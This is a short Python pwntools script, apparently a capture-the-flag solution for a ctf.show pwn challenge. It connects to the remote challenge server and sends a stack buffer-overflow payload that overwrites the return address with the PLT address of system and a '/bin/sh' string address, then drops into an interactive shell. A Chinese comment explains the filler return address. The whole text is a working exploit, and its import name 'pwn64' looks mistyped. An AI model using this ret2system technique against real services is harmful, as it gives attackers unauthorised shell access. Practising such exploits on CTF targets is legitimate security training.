from pwn64 import *
sh=remote("pwn.challenge.ctf.show",28129)
system=0x080483D0  #483D0是plt表里的system，如果换用text段的system就不需要再发送'aaaa'
bin=0x080487BA
payload=b'a'*(0x12+4)+p32(system)+b'aaaa'+p32(bin)
sh.sendline(payload)
sh.interactive()